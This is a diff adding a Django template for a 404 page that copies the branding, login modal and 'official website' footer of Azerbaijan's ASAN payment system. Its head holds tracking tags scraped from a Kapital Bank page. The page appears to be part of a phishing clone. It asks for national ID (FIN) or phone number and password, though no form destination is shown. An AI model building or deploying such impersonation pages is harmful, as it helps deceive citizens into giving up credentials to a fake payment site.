@@ -1,0 +1,123 @@
+{% load static %}
+<html lang="az"><head>
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>AsanPay</title>
+    <link rel="stylesheet" type="text/css" href="{% static 'css/style.css' %}">
+    <link rel="stylesheet" type="text/css" href="{% static '/css/intro.css' %}">
+    <link rel="shortcut icon" href="{% static '/favicon.png' %}" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600&amp;display=swap" rel="stylesheet">
+<meta http-equiv="origin-trial" content="A727AcAeLCei/ZogJHBlJUS63SxP6AeIROo7qXrkjrxkoxBu0eSSmypAHmGYwk4HjBMQp5nxCFODzfVnUIe31AQAAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjg4MDgzMTk5LCJpc1RoaXJkUGFydHkiOnRydWV9"><script type="text/javascript" async="" src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/956963899/?random=1683218632980&amp;cv=11&amp;fst=1683218632980&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;gtm=45He3510&amp;u_w=1920&amp;u_h=1080&amp;url=https%3A%2F%2Fedvgerial.kapitalbank.az%2Faz%2Flasdasdas&amp;hn=www.googleadservices.com&amp;frm=0&amp;tiba=Edvgerial&amp;uaa=x86&amp;uab=64&amp;uafvl=Chromium%3B112.0.5615.138%7CGoogle%2520Chrome%3B112.0.5615.138%7CNot%253AA-Brand%3B99.0.0.0&amp;uamb=0&amp;uap=Windows&amp;uapv=15.0.0&amp;uaw=0&amp;rfmt=3&amp;fmt=4"></script></head>
+<body>
+    <style>
+		body {
+			background-color: #f7f7f7;
+			font-family: Arial, sans-serif;
+			font-size: 16px;
+			line-height: 1.5;
+			color: #333;
+			margin: 0;
+			padding: 0;
+		}
+		.containe {
+			max-width: 600px;
+			margin: 0 auto;
+			padding: 40px;
+			background-color: #fff;
+			border: 1px solid #e2e2e2;
+			box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+			text-align: center;
+		}
+		h1 {
+			font-size: 36px;
+			margin-top: 0;
+			margin-bottom: 20px;
+			color: #333;
+		}
+		p {
+			margin-bottom: 30px;
+		}
+		a {
+			color: #007bff;
+			text-decoration: none;
+		}
+		a:hover {
+			text-decoration: underline;
+		}
+        .aga{
+            padding: 0.75rem;
+            border: 1px solid #2873f0;
+            color: #2873f0;
+            border-radius: 0.25rem;
+            text-align: center;
+        }
+        .aga{
+            color: #414141;
+            text-decoration: none;
+            transition: color .3s ease,font-weight .3s ease,background-color .3s ease;
+        }
+        .page.error-page h1 {
+            padding: 2rem;
+            text-align: center;
+        }
+        
+        .uppercase, .info-grid ul li .grid-title, .page.error-page h1, h2, h4 {
+            text-transform: uppercase;
+        }
+        .page h1 {
+            padding-bottom: 2rem;
+        }
+        .primary-font-bold, .user-balance .balance-title, .how-timeline .timeline .timeline-item .item-body .item-title, .info-grid ul li .grid-title, .page.error-page .error-code, .receipt-table__header, .modal.rules-modal .modal-content ul li h4, .auth-box .title, .auth-component .auth-left .auth-info h3, .accordion .accordion-item .accordion-title, .add-receipt input, .add-receipt .long-btn, .add-receipt .class .show-history, .add-receipt .class .close-history, h1, .heading-1, .payment-confirmation-step .confirmation-title, .big-text, .auth-box .auth-form .success-step____title {
+            font-family: "Averta",Arial,"Helvetica Neue",Helvetica,sans-serif;
+            font-weight: bold;
+        }
+        h1, .heading-1, .payment-confirmation-step .confirmation-title {
+            font-size: 1.5rem;
+        }
+        /* General styles */
+body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+  }
+  
+  .container {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 20px;
+  }
+  
+  /* Mobile styles (default) */
+  .header, .nav, .content, .footer {
+    padding: 20px;
+  }
+  
+  /* Tablet styles */
+  @media (min-width: 768px) {
+    .nav {
+      display: flex;
+      justify-content: space-around;
+    }
+  }
+  
+  /* Desktop styles */
+  @media (min-width: 1024px) {
+    .header, .nav, .content, .footer {
+      padding: 40px;
+    }
+  }
+  
+	</style>
+
+    <header class="col-lg-12"><div class="container"><div class="row"><div class="col"><a href="{% url 'index' %}" class="logo"><img src="{% static '/img/logo.svg' %}" alt=""></a></div><div class="float-right login-registration-buttons col-5 col-sm-6"><div class="float-right text-center mb-2"><img src="{% static '/img/logo.svg' %}" class="mb-3 mb-sm-0" alt="108"></div></div><div class="col col-lg-12 search-service mt-25"><h2>Ödəniş etməyin ən asan yolu</h2></div></div><div id="loginModal" class="modal fade" role="dialog"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title ">Daxil ol</h5><button type="button" class="close" data-dismiss="modal">×</button></div><div class="modal-body"><nav class="login-type" data-type="loginTypeSelect"></nav><nav><ul class="nav nav-tabs w-100" role="tablist"><li class="nav-item col-6 col-lg-8 p-0"><a class="nav-link h-100 active" href="#viaPhoneNumberOrPin" aria-controls="home" role="tab" data-toggle="tab"><span>TELEFON VƏ YA FİN</span></a></li><li class="nav-item col-6 col-lg-4 p-0"><a class="nav-link h-100" href="https://asanpay.az/asan-login"><img src="/img/ASANLoginLogo.svg" class="p-0" alt=""></a></li></ul><div class="tab-content"><div role="tabpanel" class="tab-pane active pt-4" id="viaPhoneNumberOrPin"><form><div class="form-group login-phone-or-pin"><div class="btn-group w-100 mb-3" data-toggle="buttons"><label class="w-50 btn btn-secondary active" id="byPinLabel"><input type="radio" name="login_type" id="byPin" autocomplete="off" value="pin" checked="">FİN ilə</label><label class="w-50 btn btn-secondary" id="byPhoneLabel"><input type="radio" name="login_type" id="byPhone" autocomplete="off" value="phone">Telefon nömrəsi ilə</label></div><div class="input-group pin-input"><input type="text" name="username" class="form-control inputmask-pin text-uppercase" placeholder="FİN-i daxil edin" data-focustonextinput="{ &quot;length&quot;: 7, &quot;nextInput&quot;: &quot;password&quot; }"><span class="fa fa-info-circle info-popup is-close info-popup-input for-input" title="FİN kod nədir?"></span></div><div class="phone-input hidden"><div class="col-12 p-0"><div class="float-left col-12 col-sm-6 p-0 m-0"><nav class="col-12 col-sm-5 float-left m-0 mb-3 mb-sm-0 mr-sm-1 p-0"><input type="text" class="form-control" name="countryCode" readonly="" value="+994"></nav><nav class="col-12 col-sm-6 float-left m-0 mb-3 mb-sm-0 p-0"><select class="form-control" name="operator" data-index="0"><option value="50">50</option><option value="51">51</option><option value="55">55</option><option value="60">60</option><option value="70">70</option><option value="77">77</option><option value="99">99</option></select></nav></div><nav class="col-12 col-sm-6 float-right p-0"><input type="text" class="form-control inputmask" data-inputmask="'mask': '999-99-99'" name="phone" placeholder="Mobil nömrə" data-focustonextinput="{ &quot;length&quot;: 9, &quot;nextInput&quot;: &quot;password&quot; }"></nav><div class="clearfix"></div></div></div><div class="input-group"><input type="password" class="form-control show-hide-input-icon-exist" autocomplete="off" name="password" placeholder="Şifrə"><span class="show-hide-input"><i class="fa fa-eye-slash" aria-hidden="true"></i></span></div><input type="submit" class="btn btn-primary btn-block" value="Giriş"><a href="/files/ASAN_ödəniş_təlimat.pdf" class="pull-left" target="_blank">İstifadəçi təlimatı</a><a href="#" class="pull-right">Şifrəmi unutmuşam</a></div><div class="clearfix"></div></form></div><div role="tabpanel" class="tab-pane pt-4" id="ViaAsanSign"><form class=""><div class="col-12 p-0"><div class="float-left col-12 col-sm-6 p-0 m-0"><nav class="col-12 col-sm-5 float-left m-0 mb-3 mb-sm-0 mr-sm-1 p-0"><input type="text" class="form-control" name="countryCode" readonly="" value="+994"></nav><nav class="col-12 col-sm-6 float-left m-0 mb-3 mb-sm-0 p-0"><select class="form-control" name="operator" data-index="0"><option value="50">50</option><option value="51">51</option><option value="55">55</option><option value="60">60</option><option value="70">70</option><option value="77">77</option><option value="99">99</option></select></nav></div><nav class="col-12 col-sm-6 float-right p-0"><input type="text" class="form-control inputmask" data-inputmask="'mask': '999-99-99'" name="phone" placeholder="Mobil nömrə" data-focustonextinput="{ &quot;length&quot;: 9, &quot;nextInput&quot;: &quot;userId&quot; }"></nav><div class="clearfix"></div></div><input type="hidden" name="app" value="asan_pay"><div class="input-group"><input type="password" class="form-control inputmask show-hide-input-icon-exist" name="userId" data-inputmask="'mask': '999999'" placeholder="İstifadəçi ID-si"><span class="show-hide-input"><i class="fa fa-eye-slash" aria-hidden="true"></i></span></div><input type="submit" class="btn btn-primary btn-block" value="Giriş"></form></div><div role="tabpanel" class="tab-pane p-4" id="viaESignature"><div class="fs-14">Elektron imza kartınız və kart oxuyucu qurğu (“card reader”) və ya flaş imza kartı kompüterinizə qoşulmuşdurmu?</div><form class="float-right"><input type="hidden" name="app" value="asan_pay"><input class="btn btn-right btn-primary" type="submit" value="Bəli"></form></div></div></nav><div class="clearfix"></div><br></div></div></div></div></header>
+	<div class="containe">
+        <img src="{% static '/img/404.png' %}" alt="404 Sayfa Bulunamadı"><br><br>
+		<h1>AsanPay - 404 Sehife Tapilmadi</h1>
+		<p>TƏƏSSÜF Kİ, AXTARDIĞINIZ SƏHİFƏ MÖVCUD DEYİL.</p>
+		<p><a href="/az/dashboard" class="aga">
+            Əsas səhifəyə qayıt</a></p>
+        
+	</div>
+    <footer class="col-lg-12"><div class="container d-flex"><div class="col-lg-7 col-sm-6"><div class="info"><p><a href="/integration-window/">Dövlət Qurumları üçün keçid</a><a href="/intro/contact">Əlaqə</a></p><p>2015 - 2023 © ASAN ödəniş sisteminin rəsmi internet saytı. Müəllif hüquqları qorunur.</p></div></div><div class="col-5"><a href=""><img src="{% static '/img/icenter-logo.png' %}" id="EHIMlogo" alt="ICENTER"></a></div></div></footer>
+</body></html>
